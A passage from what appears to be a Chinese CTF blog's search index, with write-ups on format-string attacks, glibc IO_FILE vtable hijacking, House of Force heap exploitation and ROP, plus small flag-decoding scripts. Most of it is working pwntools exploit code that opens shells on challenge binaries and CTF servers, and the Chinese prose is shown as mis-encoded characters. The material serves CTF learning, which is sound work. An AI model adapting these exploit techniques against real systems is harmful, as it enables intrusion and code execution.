0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() sla(\"input\",\"1\") sla(\"input\",\"2\") sla(\"input\",\"3\") sla(\"input\",\"%13$pAAAA%11$p\") sleep(0.1) ru(\"0x\") tag = int(r(12),16) - 0xe0 ru(\"AAAA0x\") libc_base = int(r(12),16) -0x21b97 info_addr(\"libc_base\",libc_base) key1 = hex(tag)[-4:] print(key1) payload = '%&#123;&#125;c%13$hn'.format(int(key1,16)) sla(\"input\",payload) sleep(5) rec = rce18[1] + libc_base key2 = hex(rec)[-4:] print(key2) payload = '%&#123;&#125;c%39$hn'.format(int(key2,16)) sla(\"input\",payload) sleep(5) key3 = int(hex(tag)[-2:],16) + 2 print(key3) payload = '%&#123;&#125;c%13$hhn'.format(key3) sla(\"input\",payload) sleep(5) key4 = hex(rec)[-6:-4] print(key4) payload = '%&#123;&#125;c%39$hhn'.format(int(key4,16)) sla(\"input\",payload) itr() # 0000| 0x7fffffffe2f0 --&gt; 0x555555554980 (push r15) # 0008| 0x7fffffffe2f8 --&gt; 0x55554780 # 0016| 0x7fffffffe300 --&gt; 0x555555756010 (\"11111111aaaaaaaa1111111122222222\\n\") # 0024| 0x7fffffffe308 --&gt; 0x84fa9f2a7e35ae00 # 0032| 0x7fffffffe310 --&gt; 0x555555554980 (push r15) # 0040| 0x7fffffffe318 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;: mov edi,eax) # 0048| 0x7fffffffe320 --&gt; 0x1 # 0056| 0x7fffffffe328 --&gt; 0x7fffffffe3f8 --&gt; 0x7fffffffe67a (\"/media/psf/mypwn/ahys/6/springboard/springboard\") # 0064| 0x7fffffffe330 --&gt; 0x1f7ffcca0 # 0072| 0x7fffffffe338 --&gt; 0x55555555488a (push rbp) # 0080| 0x7fffffffe340 --&gt; 0x0 # 0088| 0x7fffffffe348 --&gt; 0x6e8193b15e1baa42 # 0096| 0x7fffffffe350 --&gt; 0x555555554780 (xor ebp,ebp) # 0104| 0x7fffffffe358 --&gt; 0x7fffffffe3f0 --&gt; 0x1 # 0112| 0x7fffffffe360 --&gt; 0x0 # 0120| 0x7fffffffe368 --&gt; 0x0 # 0128| 0x7fffffffe370 --&gt; 0x3bd4c6e40b5baa42 # 0136| 0x7fffffffe378 --&gt; 0x3bd4d65e62cbaa42 # 0144| 0x7fffffffe380 --&gt; 0x0 # 0152| 0x7fffffffe388 --&gt; 0x0 # 0040| 0x7ffe4f08d2d8 --&gt; 0x7f2169b2a830 secretè€ƒç‚¹å°±æ˜¯IO_FILEçš„ç›¸å…³çŸ¥è¯†äº†ï¼Œæ˜¯é’ˆå¯¹ä¼ªé€  vtable åŠ«æŒç¨‹åºæµç¨‹ã€‚ è¿™ä¸ªé¢˜ä¼°è®¡æ˜¯å‚è€ƒhttps://xz.aliyun.com/t/7205è¿™ä¸ªé¢˜å‡ºçš„ï¼Œä½†æ˜¯æ–‡ä¸­çš„é¢˜æ¯”è¿™ä¸ªè¦éš¾å¤šäº†ã€‚ï¼ˆpsï¼šæ„Ÿè°¢å‡ºé¢˜äººæ‰‹ä¸‹ç•™æƒ…ï¼‰ fclose å‡½æ•°è°ƒç”¨çš„ vtable å‡½æ•° vtable å‡½æ•° æŒ‡é’ˆï¼š /* The 'finish' function does any final cleaning up of an _IO_FILE object. It does not delete (free) it, but does everything else to finalize it. It matches the streambuf::~streambuf virtual destructor. */ typedef void (*_IO_finish_t) (FILE *, int); /* finalize */ #define _IO_FINISH(FP) JUMP1 (__finish, FP, 0) #define _IO_WFINISH(FP) WJUMP1 (__finish, FP, 0) struct _IO_jump_t &#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue); &#125;; å¯¹äºæ”»å‡»çš„vtable å‡½æ•° æŒ‡é’ˆå…¶ä¸­çš„ï¼š __finish__ __close å…¶æ‰§è¡Œé¡ºåºæ˜¯å…ˆcloseï¼Œç„¶åfinishã€‚ç”±äºç¨‹åºç»™çš„æ˜¯0x18å­—èŠ‚çš„ä»»æ„å†™ï¼Œæ”»å‡» __finish__å°±å¯ä»¥äº†ã€‚ libc2.29ä¸­çš„vtablevtableçš„å€¼ï¼Œä»¥åŠå…¶å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆï¼Œåœ¨glibc 2.29ä¸‹æ˜¯å¯å†™çš„ã€‚è¿™ä¸ªæ˜¯å¾ˆé‡è¦çš„ä¸€ç‚¹ï¼Œæœ¬æ¥ä¸ªäººä¸çŸ¥é“è¿™ä¸ªï¼Œæƒ³äº†å¥½ä¹…å…¶ä»–çš„åŠæ³•æ¥åˆ©ç”¨ã€‚ åœ¨glibc 2.23ä»¥åŠglibc 2.27å…¶éƒ½æ˜¯ä¸å¯å†™çš„ã€‚ æ­£æ˜¯å› ä¸ºå¯ä»¥å†™ï¼Œæ‰€ä»¥è¿™ä¸ªé¢˜éš¾åº¦å°±é™ä½äº†å¾ˆå¤šã€‚ æ”»å‡»æ€è·¯åˆ©ç”¨ç¨‹åºçš„æœ€åä¸€æ¬¡ä»»æ„åœ°å€å†™ï¼Œç›´æ¥æŠŠ__IO_2_1_stderrçš„vtableä¸Š__finish__æŒ‡é’ˆä¿®æ”¹ä¸ºone gadgetã€‚ï¼ˆè¿™é‡Œçš„one gadgetï¼Œéœ€è¦è‡ªå·±å¤šè¯•ï¼‰ã€‚ å°tipsç¬¬2æ¬¡çš„2å­—èŠ‚è¯»å…¥å¯ä»¥ç›´æ¥ç”¨å…¶æœ¬æ¥åœ°å€æœ«2å­—èŠ‚å³å¯ï¼Œç›´æ¥åœ¨__IO_2_1_stderrçš„vtableä¸ç”¨è½¬ç§»ä¹Ÿå¯ä»¥çš„ã€‚ï¼ˆçœ‹åˆ°æœ‰åˆ«çš„å¸ˆå‚…è½¬ç§»åˆ°å…¶ä»–vtableåœ°å€çš„ã€‚ï¼‰å¹¶ä¸”ï¼Œç”±äºæ˜¯readå‡½æ•°ï¼Œç›´æ¥å‘ä¸ª\\x60ä¸€ä¸ªå­—èŠ‚å³å¯ã€‚ expfrom pwn import * import time local_file = './secret' local_libc = '/usr/lib/x86_64-linux-gnu/libc-2.29.so' remote_libc = './libc6_2.29-0ubuntu2_amd64.so' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('183.129.189.60',10030) libc = ELF(remote_libc) elf = ELF(local_file) # libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww']#,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() ru(\"0x\") libc_base = int(r(12),16) - libc.symbols[\"printf\"] info_addr(\"libc_base\",libc_base) ru(\"addr\") vtable = 0x1e5758 + libc_base s(p64(vtable)) sleep(0.1) # debug() s('\\x60') sleep(0.1) rec = 0xe2386 + libc_base s(p64(0) + p64(0)+p64(rec)) itr() ç”±äºæå‰å°±fclose(stdout),getshellä»¥åä¹Ÿä¸ä¼šæœ‰ä»»ä½•çš„è¾“å‡ºï¼Œæ‰€ä»¥å¾—ç”¨exec 1&gt;&amp;2æ¥æ¢å¤è¾“å‡ºã€‚","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"},{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"House of Force","slug":"House of Force","date":"2020-05-13T13:30:55.952Z","updated":"2020-09-16T15:23:01.011Z","comments":true,"path":"2020/05/13/House of Force/","link":"","permalink":"http://chumen77.xyz/2020/05/13/House of Force/","excerpt":"","text":"House of Forceå‰è¨€åŸºæœ¬æŒ‰ç…§è¿™wikiä¸Šé¢å­¦çš„ï¼Œç®€å•è®°å½•ä¸€ä¸‹ã€‚ åŸç† ä½¿ç”¨æ¡ä»¶ èƒ½å¤Ÿä»¥æº¢å‡ºç­‰æ–¹å¼æ§åˆ¶åˆ° top chunk çš„ size åŸŸ èƒ½å¤Ÿè‡ªç”±åœ°æ§åˆ¶å †åˆ†é…å°ºå¯¸çš„å¤§å°äº§ç”ŸåŸå› House Of Force äº§ç”Ÿçš„åŸå› åœ¨äº glibc å¯¹ top chunk çš„å¤„ç†ï¼šè¿›è¡Œå †åˆ†é…æ—¶,å¦‚æœæ‰€æœ‰ç©ºé—²çš„å—éƒ½æ— æ³•æ»¡è¶³éœ€æ±‚,é‚£ä¹ˆå°±ä¼šä» top chunk ä¸­åˆ†å‰²å‡ºç›¸åº”çš„å¤§å°ä½œä¸ºå †å—çš„ç©ºé—´ã€‚ æ‰€ä»¥å½“ä½¿ç”¨ top chunk åˆ†é…å †å—çš„ size å€¼æ˜¯ç”±ç”¨æˆ·æ§åˆ¶çš„ä»»æ„å€¼æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆ?ç­”æ¡ˆæ˜¯,å¯ä»¥ä½¿å¾— top chunkæŒ‡å‘æˆ‘ä»¬æœŸæœ›çš„ä»»ä½•ä½ç½®,è¿™å°±ç›¸å½“äºä¸€æ¬¡ä»»æ„åœ°å€å†™ã€‚ // è·å–å½“å‰çš„top chunkï¼Œå¹¶è®¡ç®—å…¶å¯¹åº”çš„å¤§å° victim = av-&gt;top; size = chunksize(victim); // å¦‚æœåœ¨åˆ†å‰²ä¹‹åï¼Œå…¶å¤§å°ä»ç„¶æ»¡è¶³ chunk çš„æœ€å°å¤§å°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿›è¡Œåˆ†å‰²ã€‚ if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; remainder_size = size - nb; remainder = chunk_at_offset(victim, nb); av-&gt;top = remainder; set_head(victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); check_malloced_chunk(av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; &#125; æ‰€ä»¥ï¼Œå¦‚æœå¯ä»¥ç¯¡æ”¹ size ä¸ºä¸€ä¸ªå¾ˆå¤§å€¼,å°±å¯ä»¥è½»æ¾çš„é€šè¿‡è¿™ä¸ªéªŒè¯,è¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢è¯´çš„éœ€è¦ä¸€ä¸ªèƒ½å¤Ÿæ§åˆ¶top chunk size åŸŸçš„æ¼æ´ã€‚ ä¸€èˆ¬çš„åˆ©ç”¨åŠæ³• remainder = chunk_at_offset(victim, nb); av-&gt;top = remainder; /* Treat space at ptr + offset as a chunk */ #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s))) ä¹‹åè¿™é‡Œä¼šæŠŠ top chunkçš„ æŒ‡é’ˆæ›´æ–°ï¼Œæ¥ä¸‹æ¥çš„å †å—å°±ä¼šåˆ†é…åˆ°è¿™ä¸ªä½ç½®ï¼Œç”¨æˆ·åªè¦æ§åˆ¶äº†è¿™ä¸ªæŒ‡é’ˆå°±ç›¸å½“äºå®ç°ä»»æ„åœ°å€å†™ä»»æ„å€¼(write-anything-anywhere)ã€‚ ç®€å•å®ä¾‹è®©top chunk çš„æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢(ä½åœ°å€) çš„gotè¡¨ä¸­çš„å†…å®¹è¿™ä¸ªæ ¸å¿ƒå°±æ˜¯æ¥ç¼©å°top chunk çš„æŒ‡é’ˆï¼Œæ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢(ä½åœ°å€) çš„æŸå¤„ä¸­çš„å†…å®¹ã€‚è¿™é‡Œå¯èƒ½æ˜¯heapçš„æŒ‡é’ˆï¼Œgotè¡¨ã€‚é€šå¸¸åº”è¯¥éƒ½æ˜¯æ‰“heapï¼Œå› ä¸ºheapçš„åœ°å€æ˜¯ç›¸å¯¹çš„ï¼Œä¸ä¼šæ”¶åˆ°åœ°å€éšæœºåŒ–çš„å½±å“ã€‚è€Œæ‰“gotçš„è¯ï¼Œå †çš„åœ°å€æ˜¯éšæœºçš„ï¼Œå¹¶æ— æ³•ç¡®å®šç”³è¯·å¤šå°‘size å¤§å°çš„å †ï¼Œå¯ä»¥æ”»å‡»åˆ°got è¿™å…¶ä¸­æœ‰ä¸ªéš¾ç¼ çš„é—®é¢˜å°±æ˜¯ç»“æ„ä½“å¯¹é½é—®é¢˜ï¼Œç›®å‰æˆ‘æ‰€ç»ƒä¹ åˆ°çš„é¢˜é‡åˆ°è¿™ä¸ªé—®é¢˜çš„éƒ½æ˜¯ï¼Œå‡å»ä¸€ä¸‹SIZE_SZï¼ˆ64ä½æ˜¯8 ï¼Œ32ä½æ˜¯4ï¼‰ã€‚ è®©é‚£ä¸ªtop chunk æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹ä½äºé«˜åœ°å€ç©ºé—´çš„å†…å®¹è¿™ä¸ªæ˜¯è¾ƒå¥½ç†è§£çš„ï¼Œå¸¸ç”¨ä¿®æ”¹libcä¸Šé¢æŸå¤„çš„åœ°å€ã€‚ hitcon-training-bambooboxä¸»è¦æ˜¯ä¿®æ”¹ä¸€ä¸‹ï¼Œå¼€å§‹ç¨‹åºè‡ªåŠ¨åˆ›å»ºçš„å­˜æ”¾2ä¸ªå‡½æ•°æŒ‡é’ˆçš„å †ï¼Œå…¶ä¸­hello-messageç”¨äºç¨‹åºå¼€å§‹æ—¶ä½¿ç”¨ï¼Œgoodbye-message ç”¨äºåœ¨ç¨‹åºç»“æŸæ—¶ä½¿ç”¨ã€‚ åˆ©ç”¨æ€è·¯ æ·»åŠ å †å—ï¼Œåˆ©ç”¨å †æº¢å‡ºæ¼æ´è¦†ç›– top chunk çš„å¤§å°ä¸º -1ï¼Œå³ 64 ä½æœ€å¤§å€¼ã€‚ åˆ©ç”¨ house of force æŠ€å·§ï¼Œåˆ†é… chunk è‡³å †çš„åŸºåœ°å€ã€‚ è¦†ç›– goodbye-message ä¸ºmagic å‡½æ•°åœ°å€æ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚ expfrom pwn import * import time local_file = './bamboobox' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # '../libc.so.6 debug = 1 if debug: io = process(local_file) context.log_level = 'debug' libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',25784) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww']#,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + ': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def dbg(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,content): sla('choice','2') sla('item name:',str(size)) sa('item',str(content)) def free(id): sla('choice','4') sla('item',str(id)) def show(id): sla('choice','1') def edit(id,size,content): sla('choice','3') sla('item',str(id)) sla('item name',str(size)) sa('item',str(content)) context.log_level = 'debug' magic = 0x400d49 add(0x30,'chum') payload = 'a' * 0x30 +p64(0) + p64(0xffffffffffffffff) edit(0,0x40,payload) size = -(0x40 + 0x20) - 0x10 add(size,' ') payload = p64(0x400d49) + p64(0x400d49) add(0x10,payload) # sla('choice:','5') itr() gyctf-2020-forceidaåˆ†æå¯ä»¥å®ç°å †æº¢å‡ºã€‚å¹¶ä¸”åœ¨ä½ ç”³è¯·ä¸€ä¸ªå †å—ä»¥åï¼Œç¨‹åºä¼šç»™ä½ æ‰“å°å‡ºå †å—çš„åœ°å€ï¼Œè¿™æ ·å°±å¯ä»¥æ³„éœ²å‡ºä¿¡æ¯ã€‚ åˆ©ç”¨æ€è·¯ ç”³è¯·ä¸€ä¸ªå¾ˆå¤§å †ï¼Œç„¶åç¨‹åºä¼šmmapå¼€å¯ä¸€ä¸ªå †å—ï¼Œæ­¤æ—¶å°±å¯ä»¥æ³„æ¼å‡ºlibcçš„åœ°å€ã€‚ HOF __malloc_hook + one gadget expfrom pwn import * import time local_libc = '/lib/x86_64-linux-gnu/libc.so.6' local_file = './gyctf_2020_force' remote_libc = local_libc # '../libc.so.6 debug = 0 if debug: io = process(local_file) context.log_level = 'debug' libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',29457) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww']#,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def dbg(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,date): sla('2:puts','1') sla('size',str(size)) ru('bin addr 0x') heapaddr = int(r(12),16) info_addr('heapaddr',heapaddr) sa('content',str(date)) return heapaddr payload = 0x30 * 'a' + p64(0) + p64(0xffffffffffffffff) libc_base = add(0x200000,'111') + 0x200ff0 info_addr('libc_base',libc_base) malloc_hook = libc_base + 0x3c4b10 heapaddr = add(0x30,payload) size = malloc_hook-(heapaddr + 0x30) - 0x10 - 0x8 -0x8 -0x8 print('size----&gt;'+hex(size)) add(size,'a') rce = rce16[1] + libc_base payload = p64(0) + p64(rce) + p64(libc_base + libc.symbols['__libc_realloc'] + realloc[1]) add(0x20,payload) sla('2:puts','1') sla('size','30') # dbg() itr() bcloud_bctf_2016è¿™ä¸ªé¢˜æ˜¯ä¸€ä¸ªååˆ†ç²¾å¦™çš„é¢˜ï¼Œæ¼æ´å‡ºç°åœ¨ç¨‹åºåˆå§‹åŒ–ã€‚ strcpyæ˜¯ä»¥\\x00æ¥åˆ¤æ–­ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç»“æŸçš„ã€‚åœ¨æ ˆä¸­ï¼Œå½“è¾“å…¥0x40ä¸ªå­—ç¬¦æ—¶ï¼Œå› ä¸ºv2æ­£å¥½åœ¨sä¸‹é¢ï¼Œè¿™å°±è®©strcpyä»så¾€v2ä¸Šé¢å¤åˆ¶æ—¶ä¼šæŠŠè¿™ä¸ªå †å—çš„åœ°å€ä¹Ÿç»™å¤åˆ¶ä¸Šå»ï¼Œå½“å…¶è¿”å›nameæ—¶ï¼Œä¹Ÿå°±è¿”å›äº†å †å—åœ°å€ï¼Œç„¶åå°±å¯ä»¥ç®—å‡ºå †å—çš„åŸºåœ°å€ã€‚ åˆ°äº†è¿™ä¸ªä¹Ÿæ˜¯è¿™ä¸ªæ¼æ´ï¼Œå¡«å……å®Œ0x40ä¸ªå­—ç¬¦åï¼Œä¼šæŠŠorgå †å—çš„æŒ‡é’ˆå’Œv3é‡Œé¢çš„å†…å®¹ç»™å¤åˆ¶åˆ°orgå¯¹åº”çš„å †å—é‡Œï¼Œä¹Ÿå°±æ˜¯0x40 + 4 + len(v3)å­—èŠ‚çš„ä¸œè¥¿ã€‚orgåœ¨å †å—æ’å¸ƒä¸­ä¹Ÿæ˜¯æœ€åä¸€ä¸ªï¼Œå¦‚æœä¼ è¿‡å»0xffffffff,å°±å¯ä»¥æ”¹åˆ°top chunkçš„sizeä½ã€‚ åˆ©ç”¨æ€è·¯ leakå †å—base ä¿®æ”¹top chunk size hofåˆ°heaplistå¤„ ç»™heaplistå†™ä¸Šfree gotï¼Œç”¨editï¼Œä¿®æ”¹å…¶ä¸ºputs æ³„æ¼libcåœ°å€ ä¿®æ”¹free got ä¸ºsystemï¼Œç„¶åæŒ‡å‘/bin/sh\\x00 expfrom pwn import * from LibcSearcher import * import time local_file = './bcloud_bctf_2016' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # '../libc.so.6 debug = 0 if debug: io = process(local_file) context.log_level = 'debug' libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',27301) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww']#,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def name(name): sa('name',str(name)) ru('b') heapbase = uu32(r(4)) - 0x8 info_addr('heapbase',heapbase) return heapbase def org(org,host): sa('Org:',str(org)) sla('Host:',str(host)) def add(size,content): sla('option---&gt;&gt;','1') sla('length',str(size)) sa('content:',str(content)) def edit(id,content): sla('---&gt;&gt;','3') sla('id',str(id)) sa('the new content',str(content)) def free(id): sla('-&gt;','4') sla('id',str(id)) context.log_level = 'debug' sizelist = 0x804B0A0 heaplist = 0x804B120 heapbase = name('a' * (0x40-1) + 'b') top = heapbase + 0xd8 info_addr('top',top) org('b'*0x40,p32(0xffffffff)) #chang top chunk size size = heaplist - top - 0x10 add(size,'\\n') add(0x18,'\\n') payload = p32(0) + p32(elf.got['free']) + p32(elf.got['atoi']) +p32(0x804B128+4+4) + '/bin/sh\\x00' edit(1,payload + '\\n') puts_plt = elf.plt['puts'] edit(1,p32(puts_plt) + '\\n') free(2) io.recv(1) io.recv(1) atoi = uu32(r(4)) info_addr('atoi',atoi) libc = LibcSearcher('atoi',atoi) libc_base = atoi - libc.dump('atoi') system = libc_base + libc.dump('system') info_addr('libc_base',libc_base) edit(1,p32(system) + '\\n') free(3) itr()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"Houseç³»åˆ—","slug":"Houseç³»åˆ—","permalink":"http://chumen77.xyz/tags/Houseç³»åˆ—/"},{"name":"heap","slug":"heap","permalink":"http://chumen77.xyz/tags/heap/"}]},{"title":"DASCTFå®‰æ’æœˆèµ›(4th)","slug":"DASCTFå®‰æ’æœˆèµ›","date":"2020-04-25T13:48:11.966Z","updated":"2020-10-20T02:06:34.671Z","comments":true,"path":"2020/04/25/DASCTFå®‰æ’æœˆèµ›/","link":"","permalink":"http://chumen77.xyz/2020/04/25/DASCTFå®‰æ’æœˆèµ›/","excerpt":"","text":"DASCTFå®‰æ’æœˆèµ›-pwnå‰è¨€å¼€èµ›äº†ï¼Œæœ‰ç‚¹äº‹æƒ…æ²¡æ‰“ï¼Œæ™šä¸Šå¤ç°äº†ä¸€ä¸‹ã€‚ echo-server[*] '/ctf/work/ahys/echo server/test' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ç¨‹åºå¾ˆç®€å•ï¼Œç»å…¸æ ˆæº¢å‡ºï¼Œropåˆ©ç”¨å³å¯ã€‚ä½†æ˜¯å› ä¸ºæ˜¯64ä½çš„ï¼Œå¹¶ä¸”æ˜¯glibc2.27ï¼Œå‘ç°åœ¨åšçš„æ—¶å€™æ„é€ ropé“¾æ€»æ˜¯ä¼šcurshï¼Œè°ƒè¯•å‘ç°ï¼šå‘ç°è¿™æ®µæ±‡ç¼–ç›´æ¥ä¼šè®©ç¨‹åºcurshï¼Œæƒ³èµ·æ¥exå¸ˆå‚…ä¸€ç¯‡æ–‡ç« åˆ†æè¿‡ï¼Œ64ä½ç¨‹åºropåˆ°systemæ‹¿shellçš„æ—¶å€™ä¹Ÿä¼šè¿™æ ·ã€‚ä½†æ˜¯å¾ˆå¥‡æ€ªè¿™ä¸ªä¹Ÿå‡ºç°äº†ï¼Œç´¢æ€§å°è¯•ä¸€æ³¢ã€‚è§£å†³åŠæ³•ï¼šè¿˜æ˜¯åŠ ä¸ªretï¼Œè®©æ ˆå¯¹å…¶å³å¯ã€‚ expfrom pwn import * local_file = './test' local_libc = '/lib/x86_64-linux-gnu/libc-2.27.so' remote_libc = './libc.so.6' debug = 1 if debug: io = process(local_file) libc = ELF(local_libc) else: # io = remote('node3.buuoj.cn',25390) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.log_level = 'debug' context.arch = elf.arch context.terminal = ['tmux','splitw','-h']#,'neww' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + ': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def dbg(): # gdb.attach(proc.pidof(io)[0],gdbscript=\"b main\") gdb.attach(io) pause() pop_rdi = 0x0000000000400823# : pop rdi ; ret offset = 136 start = 0x4005C0 ret = 0x0400768 sla('how long is your name:','500') payload = '\\x00' * offset + flat([ret,pop_rdi,elf.got['read'],elf.plt['printf'],start]) # dbg() sla('s you name?',payload) ru('hello ') read = uu64(r(6)) info_addr('printf',read) libc_base = read - libc.symbols['read'] info_addr('libc_base',libc_base) binsh = libc_base + libc.search(\"/bin/sh\").next() system = libc_base + libc.sym['system'] sla('how long is your name: ','500') payload = '\\x00' * offset + flat([ret,pop_rdi,binsh,system]) # rec = 0x4f322 + libc_base # dbg() sla('s you name?',payload) itr() å…¥é—¨reverses = 'akhb~chdaZrdaZudqduvdZvvv|' flag = '' for i in range(26): flag += chr((ord(s[i]) - 1) ^ 6) print(flag) Encryptsç›´æ¥çˆ†ç ´äº†ã€‚ s = [38,44,33,39,59,35,34,115,117,114,113,33,36,117,118,119,35,120,38,114,117,113,38,34,113,114,117,114,36,112,115,118,121,112,35,37,121,61] for i in range(128): flag = '' for j in range(38): flag += chr(s[j] ^ i) if flag[:4] == 'flag': print(flag)","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"},{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"rop","slug":"rop","permalink":"http://chumen77.xyz/tags/rop/"},{"name":"uaf","slug":"uaf","permalink":"http://chumen77.xyz/tags/uaf/"}]},{"title":"uafå’Œdouble free","slug":"uafå’Œdouble free","date":"2020-04-25T03:40:09.709Z","updated":"2020-06-27T16:24:30.624Z","comments":true,"path":"2020/04/25/uafå’Œdouble free/","link":"","permalink":"http://chumen77.xyz/2020/04/25/uafå’Œdouble free/","excerpt":"","text":"uafå’Œdouble 